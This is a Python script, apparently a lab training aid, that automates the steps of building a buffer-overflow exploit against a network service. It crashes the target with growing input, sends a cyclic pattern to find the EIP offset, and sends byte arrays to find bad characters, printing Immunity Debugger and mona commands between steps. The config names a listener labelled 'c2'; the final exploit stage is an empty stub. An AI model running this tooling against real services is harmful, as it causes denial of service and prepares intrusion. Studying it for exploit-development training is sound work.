#!/usr/bin/env python3

import argparse
import socket
import subprocess
import sys
import time

def generate_config_template():
    template = open("exploit_config.py","w")
    template.write("settings = {\n")
    template.write("    'mode': 'crash',\n")
    template.write("    'prefix': 'OVERFLOW1 ',\n")
    template.write("    'rhost': '10.10.10.11',\n")
    template.write("    'rport': 1337,\n")
    template.write("    'length': 2400,\n")
    template.write("    'offset': 1978,\n")
    template.write("    'lhost': '10.10.10.22',\n")
    template.write("    'lport': 443,\n")
    template.write("    'retn': 'BBBB',\n")
    template.write("    'bad_chars': ['\\x00','\\x0a','\\x0d'],\n")
    template.write("    'suffix': ''\n")
    template.write("}\n")
    template.close()
    print("[+] Done.")
    print(" -  Edit config.py and run gbfuzzer again.")

class fuzzer():
    def __init__(self,filename):
        exploit_config = __import__(filename)
        try:
            self.mode = exploit_config.settings['mode']
            self.prefix = exploit_config.settings['prefix']
            self.rhost = exploit_config.settings['rhost']
            self.rport = exploit_config.settings['rport']
            self.target = (self.rhost,self.rport)
            self.length = exploit_config.settings['length']
            self.offset = exploit_config.settings['offset']
            self.lhost = exploit_config.settings['lhost']
            self.lport = exploit_config.settings['lport']
            self.c2 = (self.lhost,self.lport)
            self.retn = exploit_config.settings['retn']
            self.bad_chars = exploit_config.settings['bad_chars']
            self.suffix = exploit_config.settings['suffix']
        except Exception as err:
            print("[x] Configuration File Error: ")
            print(" -  %s" % err)
            print("[!] Use --generate-config-template to create an example configuration file.")
            exit()

    def connect(self):
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        client.settimeout(3)
        client.connect(self.target)
        client.recv(1024)
        return client

    def send(self,bof):
        try:
            client = self.connect()
            client.send(bytes(bof + "\r\n","latin-1"))
            client.close()
            print("[+] Sent BOF.")
            try:
                client = self.connect()
                client.close()
            except:
                print("[+] Tango down!")
        except:
            print("[x] Failed to connect to port %d." % self.rport)
            exit()

    def crash(self):
        fuzz = self.prefix + "A" * 100
        while True:
            try:
                with self.connect() as client:
                    print("[*] Fuzzing with {} bytes".format(len(fuzz) - len(self.prefix)))
                    client.send(bytes(fuzz, "latin-1"))
                    client.recv(1024)
            except socket.error as err:
                print("[x] Failed to connect to port %d." % self.rport)
                print("[!] Next steps:")
                print(" -  Make sure the app really crashed.")
                print(" -  Send unique characters to determine the offset of the EIP register within your BOF.")
                exit()
            fuzz += "A" * 100
            time.sleep(1)

    def send_uniq_chars(self):
        if subprocess.run(['which','msf-pattern_create'], stdout=subprocess.DEVNULL).returncode == 0:
            uniq_chars = subprocess.check_output(['msf-pattern_create','-l',str(self.length)],universal_newlines=True).rstrip()
            bof = self.prefix + uniq_chars + self.suffix
            self.send(bof)
            print("[!] Next steps:")
            print(" -  Determine the offset of the EIP register in your BOF.")
            print(" -  If you're using Immunity Debugger, run the command below within the command input box (at the bottom of the GUI).")
            print("[>] !mona findmsp -distance %d" % self.length)
            print(" -  Under the 'Examining registers' section, look at the end of the line 'EIP contains...'")
            print(" -  The offset value represents how many bytes your BOF must contain before the EIP register is reached.")
            print(" -  Update your config.py file with said value and change the mode to 'bad'.")
        else:
            print("[x] msf-pattern_create not found.")
            exit()
       
    def send_bad_chars(self):
        overflow = "A" * self.offset
        padding = "\x90" * 16
        payload = ""
        bad_chars_in_integer_form = []
        bad_chars_in_string_form = []
        for char in self.bad_chars:
            bad_chars_in_integer_form.append(ord(char))
        for decimal in range(0, 256):
            if decimal not in bad_chars_in_integer_form:
                payload += chr(decimal)
            else:
                char = hex(decimal)
                if char.startswith('0x0'): 
                    char = char.replace('0x','\\x0')
                else:
                    char = char.replace('0x','\\x')
                bad_chars_in_string_form.append(char)
        print("[*] Excluding: %s" % ', '.join(bad_chars_in_string_form))
        payload = ''.join(payload)
        bof = self.prefix + overflow + self.retn + padding + payload + self.suffix
        self.send(bof)
        print("[!] Next phase: check which bad characters caused a memory corruption.")
        print("[>] !mona config -set workingfolder c:\mona\%p")
        print("[!] Repeat the following steps until there are no more bad characters to exclude from your exploit.")
        print(" -  Right-click the memory address of the ESP register. Then, select 'Copy selection to clipboard'.")
        print(" -  Right-click the memory address of the ESP register again. Then, select 'Follow in Dump'.")
        print("[>] !mona bytearray -b \"%s\" " % ''.join(bad_chars_in_string_form))
        print("[>] !mona compare -f C:\path\\to\\bytearray.bin -a <address_of_esp_register>")

    def exploit(self):
        payload = ""

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--generate-config-template",action="store_true")
    parser.add_argument("-f")
    args = parser.parse_args()

    if args.generate_config_template:
        generate_config_template()
    elif args.f:
        if args.f.endswith(".py"):
            filename = args.f.replace(".py","")
        else:
            filename = args.f
        gbfuzzer = fuzzer(filename)
        if gbfuzzer.mode ==  "crash":
            print("[!] Mode: crash")
            gbfuzzer.crash()
        elif gbfuzzer.mode == "unique":
            print("[!] Mode: unique")
            gbfuzzer.send_uniq_chars()
        elif gbfuzzer.mode == "bad":
            print("[!] Mode: bad")
            gbfuzzer.send_bad_chars()
        elif gbfuzzer.mode == "exploit":
            print("[!] Mode: exploit")
            gbfuzzer.exploit()
        else:
            print("[x] Invalid mode.")

if __name__ == "__main__":
    main()
